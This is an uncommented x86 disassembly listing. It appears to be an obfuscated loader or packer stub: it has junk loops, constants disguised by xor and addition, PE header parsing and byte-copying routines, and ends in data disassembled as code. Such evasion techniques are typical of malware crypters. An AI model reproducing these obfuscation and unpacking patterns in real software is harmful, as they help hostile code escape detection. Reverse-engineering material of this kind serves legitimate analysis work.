  424098:	mov    edx,DWORD PTR ds:0x42b000
  42409e:	dec    edx
  42409f:	mov    DWORD PTR ds:0x42b000,edx
  4240a5:	jmp    0x424056
  4240aa:	mov    edx,DWORD PTR [ebp+0xc]
  4240ad:	mov    DWORD PTR [ebp-0x3c],edx
  4240b0:	and    DWORD PTR ds:0x42c018,0x0
  4240ba:	mov    ecx,DWORD PTR ds:0x42c018
  4240c0:	inc    ecx
  4240c1:	mov    DWORD PTR ds:0x42c018,ecx
  4240c7:	cmp    DWORD PTR ds:0x42c018,0xa
  4240ce:	ja     0x424128
  4240d4:	jmp    0x424101
  4240d9:	push   0x3e21
  4240de:	push   0x8ac9
  4240e3:	push   DWORD PTR [ebp-0x24]
  4240e6:	push   DWORD PTR [ebp-0x20]
  4240e9:	push   0x8a2e
  4240ee:	push   DWORD PTR [ebp-0x10]
  4240f1:	push   0x6472
  4240f6:	push   0x42f0d5
  4240fb:	call   DWORD PTR ds:0x430047
  424101:	cmp    DWORD PTR ds:0x42c018,0x9
  424108:	jne    0x42411b
  42410e:	mov    ecx,DWORD PTR ds:0x42c018
  424114:	inc    ecx
  424115:	mov    DWORD PTR ds:0x42c018,ecx
  42411b:	cmp    DWORD PTR ds:0x42c018,0x10
  424122:	jb     0x4240ba
  424128:	mov    ecx,0x8a29a137
  42412d:	xor    eax,ecx
  42412f:	add    DWORD PTR [ebp-0x3c],esi
  424132:	mov    edx,DWORD PTR [ebp-0x3c]
  424135:	adc    DWORD PTR [ebp-0x38],0xffffffff
  424139:	xor    edx,ecx
  42413b:	mov    DWORD PTR [ebp-0x30],edx
  42413e:	mov    edx,DWORD PTR [ebp-0x38]
  424141:	xor    edx,0x0
  424144:	mov    DWORD PTR [ebp-0x2c],edx
  424147:	cmp    DWORD PTR [ebp-0x30],eax
  42414a:	jne    0x42415b
  424150:	mov    eax,DWORD PTR [ebp-0x24]
  424153:	cmp    edx,eax
  424155:	je     0x424188
  42415b:	mov    eax,ds:0x42f36b
  424160:	mov    eax,DWORD PTR [eax+0x1c0]
  424166:	mov    eax,DWORD PTR [eax]
  424168:	xor    edx,edx
  42416a:	add    eax,esi
  42416c:	adc    edx,0xffffffff
  42416f:	xor    eax,ecx
  424171:	xor    edx,0x0
  424174:	cmp    eax,0x70941fe9
  424179:	jne    0x424565
  42417f:	cmp    edx,0xffffffff
  424182:	jne    0x424565
  424188:	mov    eax,ds:0x42f3e7
  42418d:	mov    edx,DWORD PTR ds:0x42f3ef
  424193:	xor    eax,edx
  424195:	mov    ds:0x42f3e7,eax
  42419a:	mov    edx,DWORD PTR ds:0x42f3e7
  4241a0:	mov    eax,DWORD PTR [ebp-0x10]
  4241a3:	jmp    0x424525
  4241a8:	mov    eax,DWORD PTR [ebp-0x14]
  4241ab:	cmp    eax,0xf89c85b1
  4241b0:	je     0x42424f
  4241b6:	mov    eax,DWORD PTR [ebp-0x4]
  4241b9:	mov    ecx,DWORD PTR [ebp-0x18]
  4241bc:	xor    eax,edi
  4241be:	add    eax,ebx
  4241c0:	cmp    eax,ecx
  4241c2:	je     0x42424f
  4241c8:	push   0x42fba3
  4241cd:	call   DWORD PTR ds:0x43004f
  4241d3:	test   eax,eax
  4241d5:	je     0x4241e9
  4241db:	push   0x0
  4241dd:	push   0x0
  4241df:	push   0x42fc13
  4241e4:	jmp    0x4245d9
  4241e9:	lea    eax,[ebp-0x70]
  4241ec:	push   eax
  4241ed:	push   0x42fbdf
  4241f2:	call   DWORD PTR ds:0x430043
  4241f8:	test   eax,eax
  4241fa:	je     0x42420a
  424200:	push   0x42fc53
  424205:	jmp    0x4245fc
  42420a:	mov    eax,ds:0x42f36b
  42420f:	mov    eax,DWORD PTR [eax+0x194]
  424215:	mov    ecx,DWORD PTR [eax]
  424217:	mov    eax,DWORD PTR [ecx+0x3c]
  42421a:	push   DWORD PTR ds:0x42f443
  424220:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  424224:	push   DWORD PTR ds:0x42f1ef
  42422a:	add    eax,ecx
  42422c:	mov    ecx,DWORD PTR ds:0x42f36b
  424232:	mov    ecx,DWORD PTR [ecx+0x194]
  424238:	push   DWORD PTR [ecx]
  42423a:	call   eax
  42423c:	mov    ecx,DWORD PTR ds:0x42f36b
  424242:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424248:	mov    DWORD PTR [ecx],eax
  42424a:	jmp    0x424565
  42424f:	push   0x42f6f3
  424254:	call   DWORD PTR ds:0x43004f
  42425a:	test   eax,eax
  42425c:	je     0x424270
  424262:	push   0x0
  424264:	push   0x0
  424266:	push   0x42f763
  42426b:	jmp    0x4245d9
  424270:	mov    esi,DWORD PTR ds:0x430043
  424276:	lea    eax,[ebp-0x70]
  424279:	push   eax
  42427a:	push   0x42f72f
  42427f:	call   esi
  424281:	test   eax,eax
  424283:	je     0x424293
  424289:	push   0x42f7a3
  42428e:	jmp    0x4245fc
  424293:	mov    eax,DWORD PTR [ebp-0x4]
  424296:	mov    ecx,DWORD PTR [ebp-0x34]
  424299:	xor    eax,edi
  42429b:	add    eax,ebx
  42429d:	cmp    eax,ecx
  42429f:	jne    0x42437c
  4242a5:	mov    eax,DWORD PTR [ebp-0x4]
  4242a8:	mov    ecx,DWORD PTR ds:0x42f36b
  4242ae:	mov    ecx,DWORD PTR [ecx+0x198]
  4242b4:	xor    eax,edi
  4242b6:	add    eax,ebx
  4242b8:	cmp    eax,DWORD PTR [ecx]
  4242ba:	jne    0x42431b
  4242c0:	push   0x42f7bb
  4242c5:	call   DWORD PTR ds:0x43004f
  4242cb:	test   eax,eax
  4242cd:	je     0x4242e1
  4242d3:	push   0x0
  4242d5:	push   0x0
  4242d7:	push   0x42f82b
  4242dc:	jmp    0x4245d9
  4242e1:	lea    eax,[ebp-0x70]
  4242e4:	push   eax
  4242e5:	push   0x42f7f7
  4242ea:	call   esi
  4242ec:	test   eax,eax
  4242ee:	je     0x4242fe
  4242f4:	push   0x42f86b
  4242f9:	jmp    0x4245fc
  4242fe:	mov    eax,DWORD PTR [ebp-0x4]
  424301:	push   0xf89c85b0
  424306:	xor    eax,edi
  424308:	add    eax,ebx
  42430a:	push   eax
  42430b:	push   0xf89c85bc
  424310:	push   DWORD PTR [ebp-0x8]
  424313:	push   DWORD PTR [ebp-0x4]
  424316:	call   0x423191
  42431b:	push   0x42f883
  424320:	call   DWORD PTR ds:0x43004f
  424326:	test   eax,eax
  424328:	je     0x42433c
  42432e:	push   0x0
  424330:	push   0x0
  424332:	push   0x42f8f3
  424337:	jmp    0x4245d9
  42433c:	lea    eax,[ebp-0x70]
  42433f:	push   eax
  424340:	push   0x42f8bf
  424345:	call   esi
  424347:	test   eax,eax
  424349:	je     0x424359
  42434f:	push   0x42f933
  424354:	jmp    0x4245fc
  424359:	push   DWORD PTR [ebp-0x8]
  42435c:	push   DWORD PTR [ebp-0x4]
  42435f:	call   0x401000
  424364:	mov    eax,DWORD PTR [ebp-0x4]
  424367:	xor    eax,edi
  424369:	add    eax,ebx
  42436b:	mov    ds:0x42f3ef,eax
  424370:	mov    eax,DWORD PTR [ebp-0x4]
  424373:	xor    eax,edi
  424375:	add    eax,ebx
  424377:	mov    ds:0x42f3e7,eax
  42437c:	lea    eax,[ebp-0x1c]
  42437f:	mov    DWORD PTR [ebp-0x44],eax
  424382:	lea    eax,[ebp+0x4]
  424385:	push   0x42f94b
  42438a:	mov    DWORD PTR [ebp-0x1c],eax
  42438d:	call   DWORD PTR ds:0x43004f
  424393:	test   eax,eax
  424395:	je     0x4243a9
  42439b:	push   0x0
  42439d:	push   0x0
  42439f:	push   0x42f9bb
  4243a4:	jmp    0x4245d9
  4243a9:	lea    eax,[ebp-0x70]
  4243ac:	push   eax
  4243ad:	push   0x42f987
  4243b2:	call   esi
  4243b4:	test   eax,eax
  4243b6:	je     0x4243c6
  4243bc:	push   0x42f9fb
  4243c1:	jmp    0x4245fc
  4243c6:	mov    eax,DWORD PTR [ebp-0x1c]
  4243c9:	test   eax,eax
  4243cb:	je     0x424565
  4243d1:	push   0x42fa13
  4243d6:	call   DWORD PTR ds:0x43004f
  4243dc:	test   eax,eax
  4243de:	je     0x4243f2
  4243e4:	push   0x0
  4243e6:	push   0x0
  4243e8:	push   0x42fa83
  4243ed:	jmp    0x4245d9
  4243f2:	mov    esi,DWORD PTR ds:0x430043
  4243f8:	lea    eax,[ebp-0x70]
  4243fb:	push   eax
  4243fc:	push   0x42fa4f
  424401:	call   esi
  424403:	test   eax,eax
  424405:	je     0x424415
  42440b:	push   0x42fac3
  424410:	jmp    0x4245fc
  424415:	mov    DWORD PTR [ebp-0x48],0xf152c39
  42441c:	mov    DWORD PTR [ebp-0x4c],0x712ed2e
  424423:	mov    DWORD PTR [ebp-0x50],0x373fc08
  42442a:	mov    DWORD PTR [ebp-0x54],0x72670ad8
  424431:	call   0x421f87
  424436:	push   0x42fadb
  42443b:	call   DWORD PTR ds:0x43004f
  424441:	test   eax,eax
  424443:	je     0x424457
  424449:	push   0x0
  42444b:	push   0x0
  42444d:	push   0x42fb4b
  424452:	jmp    0x4245d9
  424457:	lea    eax,[ebp-0x70]
  42445a:	push   eax
  42445b:	push   0x42fb17
  424460:	call   esi
  424462:	test   eax,eax
  424464:	je     0x424474
  42446a:	push   0x42fb8b
  42446f:	jmp    0x4245fc
  424474:	mov    eax,DWORD PTR [ebp-0xc]
  424477:	mov    eax,DWORD PTR [ebp-0x8]
  42447a:	mov    eax,DWORD PTR [ebp-0x4]
  42447d:	mov    DWORD PTR [ebp+0xc],eax
  424480:	mov    eax,eax
  424482:	mov    eax,ds:0x42f36b
  424487:	mov    eax,DWORD PTR [eax+0x1c8]
  42448d:	mov    eax,DWORD PTR [eax]
  42448f:	cdq    
  424490:	mov    esi,0xfabdbedd
  424495:	add    eax,esi
  424497:	adc    edx,0xffffffff
  42449a:	and    DWORD PTR [ebp-0x38],0x0
  42449e:	xor    edx,0x0
  4244a1:	mov    DWORD PTR [ebp-0x24],edx
  4244a4:	mov    edx,DWORD PTR [ebp+0xc]
  4244a7:	mov    DWORD PTR [ebp-0x3c],edx
  4244aa:	mov    ecx,0x8a29a137
  4244af:	xor    eax,ecx
  4244b1:	add    DWORD PTR [ebp-0x3c],esi
  4244b4:	mov    edx,DWORD PTR [ebp-0x3c]
  4244b7:	adc    DWORD PTR [ebp-0x38],0xffffffff
  4244bb:	xor    edx,ecx
  4244bd:	mov    DWORD PTR [ebp-0x30],edx
  4244c0:	mov    edx,DWORD PTR [ebp-0x38]
  4244c3:	xor    edx,0x0
  4244c6:	mov    DWORD PTR [ebp-0x2c],edx
  4244c9:	cmp    DWORD PTR [ebp-0x30],eax
  4244cc:	jne    0x4244dd
  4244d2:	mov    eax,DWORD PTR [ebp-0x24]
  4244d5:	cmp    edx,eax
  4244d7:	je     0x42450a
  4244dd:	mov    eax,ds:0x42f36b
  4244e2:	mov    eax,DWORD PTR [eax+0x1c0]
  4244e8:	mov    eax,DWORD PTR [eax]
  4244ea:	xor    edx,edx
  4244ec:	add    eax,esi
  4244ee:	adc    edx,0xffffffff
  4244f1:	xor    eax,ecx
  4244f3:	xor    edx,0x0
  4244f6:	cmp    eax,0x70941fe9
  4244fb:	jne    0x424565
  424501:	cmp    edx,0xffffffff
  424504:	jne    0x424565
  42450a:	mov    eax,ds:0x42f3e7
  42450f:	mov    edx,DWORD PTR ds:0x42f3ef
  424515:	xor    eax,edx
  424517:	mov    ds:0x42f3e7,eax
  42451c:	mov    edx,DWORD PTR ds:0x42f3e7
  424522:	mov    eax,DWORD PTR [ebp-0x1c]
  424525:	add    DWORD PTR [eax],edx
  424527:	mov    edx,DWORD PTR [ebp+0xc]
  42452a:	mov    eax,ds:0x42f3e7
  42452f:	xor    edx,edi
  424531:	add    edx,ebx
  424533:	xor    ebx,ebx
  424535:	add    edx,esi
  424537:	adc    ebx,0xffffffff
  42453a:	xor    edi,edi
  42453c:	xor    edx,ecx
  42453e:	xor    ebx,0x0
  424541:	add    eax,esi
  424543:	adc    edi,0xffffffff
  424546:	xor    eax,ecx
  424548:	xor    edi,0x0
  42454b:	cmp    eax,edx
  42454d:	jne    0x424565
  424553:	cmp    edi,ebx
  424555:	jne    0x424565
  42455b:	mov    eax,ds:0x42f3e7
  424560:	mov    ds:0x42f3ef,eax
  424565:	mov    edi,DWORD PTR ds:0x43004f
  42456b:	push   0x42fc6b
  424570:	call   edi
  424572:	test   eax,eax
  424574:	je     0x424588
  42457a:	push   0x0
  42457c:	push   0x0
  42457e:	push   0x42fcdb
  424583:	jmp    0x4245d9
  424588:	mov    esi,DWORD PTR ds:0x430043
  42458e:	lea    eax,[ebp-0x70]
  424591:	push   eax
  424592:	push   0x42fca7
  424597:	call   esi
  424599:	test   eax,eax
  42459b:	je     0x4245ab
  4245a1:	push   0x42fd1b
  4245a6:	jmp    0x4245fc
  4245ab:	mov    eax,ds:0x42f36b
  4245b0:	push   0x4
  4245b2:	add    eax,0x1cc
  4245b7:	push   eax
  4245b8:	lea    eax,[ebp-0xc]
  4245bb:	push   eax
  4245bc:	call   0x424613
  4245c1:	push   0x42fd33
  4245c6:	call   edi
  4245c8:	test   eax,eax
  4245ca:	je     0x4245e4
  4245d0:	push   0x0
  4245d2:	push   0x0
  4245d4:	push   0x42fda3
  4245d9:	call   DWORD PTR ds:0x43001f
  4245df:	jmp    0x42460c
  4245e4:	lea    eax,[ebp-0x70]
  4245e7:	push   eax
  4245e8:	push   0x42fd6f
  4245ed:	call   esi
  4245ef:	test   eax,eax
  4245f1:	je     0x424607
  4245f7:	push   0x42fde3
  4245fc:	call   DWORD PTR ds:0x430023
  424602:	jmp    0x42460c
  424607:	mov    eax,DWORD PTR [ebp-0xc]
  42460a:	mov    eax,DWORD PTR [eax]
  42460c:	pop    ebx
  42460d:	pop    esi
  42460e:	pop    edi
  42460f:	leave  
  424610:	ret    0xc
  424613:	push   ebp
  424614:	mov    ebp,esp
  424616:	sub    esp,0x10
  424619:	add    edx,0x3c01
  42461f:	mov    eax,0xf89c85b0
  424624:	and    ecx,edx
  424626:	mov    DWORD PTR [ebp-0x4],eax
  424629:	mov    ecx,DWORD PTR ds:0x424af8
  42462f:	mov    edx,DWORD PTR ds:0x42e010
  424635:	sub    edx,ecx
  424637:	xor    ecx,DWORD PTR [ecx+edx*1]
  42463a:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  424641:	xor    edx,edx
  424643:	xor    edx,DWORD PTR ds:0x42b01c
  424649:	adc    DWORD PTR ds:0x429028,edx
  42464f:	mov    ecx,DWORD PTR [ebp-0x4]
  424652:	and    DWORD PTR ds:0x42d018,0x0
  42465c:	jmp    0x42466e
  424661:	mov    edx,DWORD PTR ds:0x42d018
  424667:	inc    edx
  424668:	mov    DWORD PTR ds:0x42d018,edx
  42466e:	cmp    DWORD PTR ds:0x42d018,0x1d
  424675:	jae    0x4246a3
  42467b:	cmp    DWORD PTR ds:0x42d018,0x20
  424682:	jg     0x4246a3
  424688:	jmp    0x42469e
  42468d:	push   DWORD PTR [ebp-0x20]
  424690:	push   DWORD PTR [ebp-0x28]
  424693:	push   0x1361
  424698:	call   DWORD PTR ds:0x43004b
  42469e:	jmp    0x424661
  4246a3:	push   esi
  4246a4:	dec    esi
  4246a5:	mov    edx,0x75108a4
  4246aa:	xor    DWORD PTR ds:0x42a00c,ebx
  4246b0:	xor    ecx,edx
  4246b2:	or     DWORD PTR ds:0x429010,0x14eb
  4246bc:	mov    esi,0x3272ec
  4246c1:	push   edi
  4246c2:	dec    DWORD PTR ds:0x429018
  4246c8:	mov    edi,DWORD PTR [ebp+0x10]
  4246cb:	adc    DWORD PTR ds:0x42d018,0x42901c
  4246d5:	add    ecx,esi
  4246d7:	cmp    ecx,edi
  4246d9:	mov    DWORD PTR ds:0x42d000,0x260f
  4246e3:	je     0x42482d
  4246e9:	mov    ecx,DWORD PTR [ebp-0x4]
  4246ec:	adc    DWORD PTR ds:0x42a01c,0x4985
  4246f6:	mov    edi,DWORD PTR [ebp+0x10]
  4246f9:	add    DWORD PTR ds:0x42b000,0x42c018
  424703:	xor    eax,eax
  424705:	or     DWORD PTR ds:0x42a004,0x42c000
  42470f:	xor    ecx,edx
  424711:	or     DWORD PTR ds:0x42b018,0x42c004
  42471b:	add    ecx,esi
  42471d:	xor    DWORD PTR ds:0x42d004,0x429014
  424727:	add    edi,0xfabdbedd
  42472d:	mov    DWORD PTR ds:0x42c01c,0x199c
  424737:	adc    eax,0xffffffff
  42473a:	sbb    DWORD PTR ds:0x42a010,0x429004
  424744:	xor    eax,0x0
  424747:	xor    DWORD PTR ds:0x429008,0x429004
  424751:	mov    DWORD PTR [ebp-0xc],eax
  424754:	mov    eax,ds:0x42d000
  424759:	xor    DWORD PTR ds:0x42c010,eax
  42475f:	push   ebx
  424760:	sub    DWORD PTR ds:0x42a01c,0x1608
  42476a:	xor    ebx,ebx
  42476c:	sub    eax,DWORD PTR ds:0x42a000
  424772:	xor    edi,0x8a29a137
  424778:	add    eax,DWORD PTR ds:0x42b01c
  42477e:	mov    eax,ecx
  424780:	sbb    DWORD PTR ds:0x42a010,0x7666
  42478a:	add    eax,0xfabdbedd
  42478f:	mov    DWORD PTR ds:0x42b000,0x3a3b
  424799:	adc    ebx,0xffffffff
  42479c:	xor    eax,0x8a29a137
  4247a1:	xor    ebx,0x0
  4247a4:	cmp    eax,edi
  4247a6:	jne    0x4247bf
  4247ac:	cmp    ebx,DWORD PTR [ebp-0xc]
  4247af:	je     0x424827
  4247b5:	jmp    0x4247bf
  4247ba:	mov    esi,0x3272ec
  4247bf:	mov    eax,DWORD PTR [ebp-0x4]
  4247c2:	mov    edi,DWORD PTR [ebp-0x8]
  4247c5:	xor    edi,edx
  4247c7:	add    edi,esi
  4247c9:	mov    esi,DWORD PTR [ebp+0x8]
  4247cc:	imul   edi,ecx
  4247cf:	mov    ebx,DWORD PTR [ebp+0xc]
  4247d2:	xor    eax,edx
  4247d4:	add    eax,ecx
  4247d6:	mov    al,BYTE PTR [ebx+eax*1+0x3272ec]
  4247dd:	mov    BYTE PTR [edi+esi*1],al
  4247e0:	mov    eax,DWORD PTR [ebp-0x8]
  4247e3:	mov    esi,DWORD PTR [ebp+0x10]
  4247e6:	xor    eax,edx
  4247e8:	xor    ebx,ebx
  4247ea:	add    esi,0xfabdbedd
  4247f0:	adc    ebx,0xffffffff
  4247f3:	lea    ecx,[ecx+eax*1+0x3272ec]
  4247fa:	xor    edi,edi
  4247fc:	xor    esi,0x8a29a137
  424802:	xor    ebx,0x0
  424805:	mov    eax,ecx
  424807:	add    eax,0xfabdbedd
  42480c:	adc    edi,0xffffffff
  42480f:	xor    eax,0x8a29a137
  424814:	xor    edi,0x0
  424817:	cmp    eax,esi
  424819:	jne    0x4247ba
  42481f:	cmp    edi,ebx
  424821:	jne    0x4247ba
  424827:	mov    eax,0xf89c85b1
  42482c:	pop    ebx
  42482d:	pop    edi
  42482e:	pop    esi
  42482f:	leave  
  424830:	ret    0xc
  424833:	push   ebp
  424834:	mov    ebp,esp
  424836:	push   ecx
  424837:	xor    DWORD PTR ds:0x42d000,edi
  42483d:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  424844:	and    DWORD PTR ds:0x42d018,0x0
  42484e:	jmp    0x42485e
  424853:	mov    eax,ds:0x42d018
  424858:	inc    eax
  424859:	mov    ds:0x42d018,eax
  42485e:	cmp    DWORD PTR ds:0x42d018,0x14
  424865:	jae    0x424892
  42486b:	cmp    DWORD PTR ds:0x42d018,0x20
  424872:	jg     0x424892
  424878:	jmp    0x42488d
  42487d:	push   0x42d008
  424882:	push   0x42f14f
  424887:	call   DWORD PTR ds:0x43000b
  42488d:	jmp    0x424853
  424892:	mov    eax,DWORD PTR [ebp+0x8]
  424895:	movsx  eax,BYTE PTR [eax]
  424898:	mov    edx,0x3272ec
  42489d:	or     DWORD PTR ds:0x42a010,ebx
  4248a3:	sub    eax,edx
  4248a5:	mov    ecx,0x75108a4
  4248aa:	dec    DWORD PTR ds:0x429008
  4248b0:	xor    eax,ecx
  4248b2:	mov    DWORD PTR ds:0x429024,0x52d3
  4248bc:	cmp    eax,0xf89c85c5
  4248c1:	mov    DWORD PTR ds:0x42d004,0x21a1
  4248cb:	jne    0x4248fa
  4248d1:	mov    eax,DWORD PTR [ebp+0x8]
  4248d4:	push   esi
  4248d5:	mov    esi,DWORD PTR [ebp+0x8]
  4248d8:	add    esi,DWORD PTR [eax+0x3c]
  4248db:	mov    DWORD PTR [ebp+0x8],esi
  4248de:	mov    eax,DWORD PTR [ebp-0x4]
  4248e1:	mov    esi,DWORD PTR [ebp+0x8]
  4248e4:	xor    eax,ecx
  4248e6:	add    eax,edx
  4248e8:	cmp    DWORD PTR [esi+0x54],eax
  4248eb:	pop    esi
  4248ec:	je     0x4248fa
  4248f2:	mov    eax,DWORD PTR [ebp+0x8]
  4248f5:	jmp    0x424901
  4248fa:	mov    eax,DWORD PTR [ebp-0x4]
  4248fd:	xor    eax,ecx
  4248ff:	add    eax,edx
  424901:	leave  
  424902:	ret    0x4
  424905:	push   ebp
  424906:	mov    ebp,esp
  424908:	sub    esp,0xc
  42490b:	sbb    ecx,0x4428
  424911:	push   esi
  424912:	add    esi,0x35e8
  424918:	mov    esi,0xf89c85b0
  42491d:	or     DWORD PTR ds:0x42d008,edi
  424923:	mov    DWORD PTR [ebp-0x8],esi
  424926:	mov    DWORD PTR [ebp-0x4],0xf89c85b1
  42492d:	push   edi
  42492e:	and    DWORD PTR ds:0x42c004,0x0
  424938:	mov    edx,DWORD PTR ds:0x42c004
  42493e:	inc    edx
  42493f:	mov    DWORD PTR ds:0x42c004,edx
  424945:	cmp    DWORD PTR ds:0x42c004,0x8
  42494c:	jl     0x42498e
  424952:	jmp    0x424967
  424957:	push   0x429014
  42495c:	push   0x86a8
  424961:	call   DWORD PTR ds:0x43000f
  424967:	cmp    DWORD PTR ds:0x42c004,0x7
  42496e:	jne    0x424981
  424974:	mov    edx,DWORD PTR ds:0x42c004
  42497a:	inc    edx
  42497b:	mov    DWORD PTR ds:0x42c004,edx
  424981:	cmp    DWORD PTR ds:0x42c004,0x14
  424988:	jb     0x424938
  42498e:	mov    eax,eax
  424990:	xor    eax,eax
  424992:	or     eax,DWORD PTR ds:0x429028
  424998:	adc    eax,DWORD PTR ds:0x42a000
  42499e:	mov    ds:0x429028,eax
  4249a3:	mov    eax,DWORD PTR [ebp-0x4]
  4249a6:	mov    edi,DWORD PTR [ebp-0x8]
  4249a9:	not    edx
  4249ab:	mov    ecx,0x75108a4
  4249b0:	mov    DWORD PTR ds:0x42c01c,0x19
  4249ba:	cmp    DWORD PTR ds:0x42c01c,0x0
  4249c1:	je     0x424a0b
  4249c7:	cmp    DWORD PTR ds:0x42c01c,0x3
  4249ce:	jg     0x424a0b
  4249d4:	jmp    0x4249df
  4249d9:	call   DWORD PTR ds:0x430013
  4249df:	cmp    DWORD PTR ds:0x42c01c,0x4
  4249e6:	jne    0x4249f9
  4249ec:	mov    edx,DWORD PTR ds:0x42c01c
  4249f2:	dec    edx
  4249f3:	mov    DWORD PTR ds:0x42c01c,edx
  4249f9:	mov    edx,DWORD PTR ds:0x42c01c
  4249ff:	dec    edx
  424a00:	mov    DWORD PTR ds:0x42c01c,edx
  424a06:	jmp    0x4249ba
  424a0b:	xor    eax,ecx
  424a0d:	xor    DWORD PTR ds:0x429018,0x18a1
  424a17:	xor    edi,ecx
  424a19:	mov    DWORD PTR ds:0x42b010,0x4247
  424a23:	mov    edx,0x3272ec
  424a28:	add    edi,edx
  424a2a:	add    eax,edx
  424a2c:	imul   eax,edi
  424a2f:	mov    edi,DWORD PTR [ebp+0xc]
  424a32:	cmp    edi,eax
  424a34:	je     0x424a89
  424a3a:	mov    DWORD PTR [ebp-0xc],esi
  424a3d:	mov    eax,DWORD PTR [ebp-0xc]
  424a40:	mov    esi,DWORD PTR [ebp+0xc]
  424a43:	xor    eax,ecx
  424a45:	lea    eax,[eax*8+0x19397d8]
  424a4c:	mov    eax,DWORD PTR [esi+eax*1]
  424a4f:	mov    DWORD PTR [ebp+0xc],eax
  424a52:	mov    eax,DWORD PTR [ebp-0x4]
  424a55:	mov    esi,DWORD PTR [ebp-0x8]
  424a58:	xor    eax,ecx
  424a5a:	xor    esi,ecx
  424a5c:	add    esi,edx
  424a5e:	add    eax,edx
  424a60:	imul   eax,esi
  424a63:	mov    esi,DWORD PTR [ebp+0xc]
  424a66:	cmp    esi,eax
  424a68:	je     0x424a89
  424a6e:	mov    eax,DWORD PTR [ebp-0x4]
  424a71:	xor    eax,ecx
  424a73:	mov    ecx,DWORD PTR [ebp+0xc]
  424a76:	add    eax,edx
  424a78:	imul   eax,ecx
  424a7b:	add    eax,DWORD PTR [ebp+0x8]
  424a7e:	mov    DWORD PTR [ebp+0xc],eax
  424a81:	mov    eax,DWORD PTR [ebp+0xc]
  424a84:	jmp    0x424a9a
  424a89:	mov    eax,DWORD PTR [ebp-0x4]
  424a8c:	mov    esi,DWORD PTR [ebp-0x8]
  424a8f:	xor    esi,ecx
  424a91:	xor    eax,ecx
  424a93:	add    esi,edx
  424a95:	add    eax,edx
  424a97:	imul   eax,esi
  424a9a:	pop    edi
  424a9b:	pop    esi
  424a9c:	leave  
  424a9d:	ret    0x8
  424aa0:	add    BYTE PTR [eax-0x6ffbffbe],dl
  424aa6:	inc    edx
  424aa7:	add    BYTE PTR [eax],cl
  424aa9:	nop
  424aaa:	inc    edx
  424aab:	add    BYTE PTR [eax+edx*4],cl
  424aae:	inc    edx
  424aaf:	add    BYTE PTR [eax],dl
  424ab1:	nop
  424ab2:	inc    edx
  424ab3:	add    BYTE PTR [eax+edx*4],dl
  424ab6:	inc    edx
  424ab7:	add    BYTE PTR [eax],bl
  424ab9:	nop
  424aba:	inc    edx
  424abb:	add    BYTE PTR [eax+edx*4],bl
  424abe:	inc    edx
  424abf:	add    BYTE PTR [eax],ah
  424ac1:	nop
  424ac2:	inc    edx
  424ac3:	add    BYTE PTR [eax+edx*4],ah
  424ac6:	inc    edx
  424ac7:	add    BYTE PTR [eax],ch
  424ac9:	nop
  424aca:	inc    edx
  424acb:	add    BYTE PTR [eax],al
  424acd:	mov    al,0x42
  424acf:	add    BYTE PTR [eax+esi*4],al
  424ad2:	inc    edx
  424ad3:	add    BYTE PTR [eax],cl
  424ad5:	mov    al,0x42
  424ad7:	add    BYTE PTR [eax+esi*4],cl
  424ada:	inc    edx
  424adb:	add    BYTE PTR [eax],dl
  424add:	mov    al,0x42
  424adf:	add    BYTE PTR [eax+esi*4],dl
  424ae2:	inc    edx
  424ae3:	add    BYTE PTR [eax],bl
  424ae5:	mov    al,0x42
  424ae7:	add    BYTE PTR [eax+esi*4],bl
  424aea:	inc    edx
  424aeb:	add    BYTE PTR [eax],al
  424aed:	mov    al,ds:0xa0040042
  424af2:	inc    edx
  424af3:	add    BYTE PTR [eax],cl
  424af5:	mov    al,ds:0xa00c0042
  424afa:	inc    edx
  424afb:	add    BYTE PTR [eax],dl
  424afd:	mov    al,ds:0xa0140042
  424b02:	inc    edx
  424b03:	add    BYTE PTR [eax],bl
  424b05:	mov    al,ds:0xa01c0042
  424b0a:	inc    edx
	...
  424b13:	add    BYTE PTR [eax+0x4d300b],ah
  424b19:	add    BYTE PTR [eax],al
  424b1b:	add    BYTE PTR [edx],al
  424b1d:	add    BYTE PTR [eax],al
  424b1f:	add    BYTE PTR [esi],dh
  424b21:	add    BYTE PTR [eax],al
  424b23:	add    BYTE PTR [eax+0x4b],dl
  424b26:	add    al,BYTE PTR [eax]
  424b28:	push   eax
  424b29:	aas    
  424b2a:	add    al,BYTE PTR [eax]
  424b2c:	add    al,al
  424b2e:	inc    edx
  424b2f:	add    BYTE PTR [eax+eax*8],al
  424b32:	inc    edx
  424b33:	add    BYTE PTR [eax],cl
  424b35:	rol    BYTE PTR [edx+0x0],0xc
  424b39:	rol    BYTE PTR [edx+0x0],0x10
  424b3d:	rol    BYTE PTR [edx+0x0],0x14
  424b41:	rol    BYTE PTR [edx+0x0],0x18
  424b45:	rol    BYTE PTR [edx+0x0],0x1c
  424b49:	rol    BYTE PTR [edx+0x0],0x0
  424b4d:	add    BYTE PTR [eax],al
  424b4f:	add    BYTE PTR [edx+0x53],dl
  424b52:	inc    esp
  424b53:	push   ebx
  424b54:	jnp    0x424b32
  424b56:	ja     0x424b18
  424b58:	fisttp QWORD PTR [ebx+0x6a84aa7]
  424b5e:	ins    DWORD PTR es:[edi],dx
  424b5f:	ret    0x3b0b
  424b62:	stos   DWORD PTR es:[edi],eax
  424b63:	aas    
  424b64:	add    DWORD PTR [eax],eax
  424b66:	add    BYTE PTR [eax],al
  424b68:	inc    ebp
  424b69:	cmp    bl,BYTE PTR [esp+eax*2+0x65]
  424b6d:	ins    BYTE PTR es:[edi],dx
  424b6e:	gs je  0x424bd6
  424b71:	and    BYTE PTR [ecx+eiz*2+0x74],al
  424b75:	popa   
  424b76:	and    BYTE PTR [ecx+ebp*2+0x72],al
  424b7a:	pop    esp
  424b7b:	inc    ecx
  424b7c:	data16 je 0x424be4
  424b7f:	jb     0x424bd1
  424b81:	popa   
  424b82:	jb     0x424bf8
  424b84:	jns    0x424b86
  424b86:	mov    edx,DWORD PTR [ebp-0x14]
  424b89:	sub    esp,0x108
  424b8f:	push   ebx
  424b90:	mov    eax,ebx
  424b92:	xchg   ecx,eax
  424b93:	mov    eax,DWORD PTR [ebp+0x8]
  424b96:	cmp    eax,0xf89c85b0
  424b9b:	jne    0x425022
  424ba1:	mov    eax,DWORD PTR [ebp+0xc]
  424ba4:	cmp    eax,0xf89c85b1
  424ba9:	jne    0x425022
  424baf:	mov    eax,DWORD PTR [ebp+0x24]
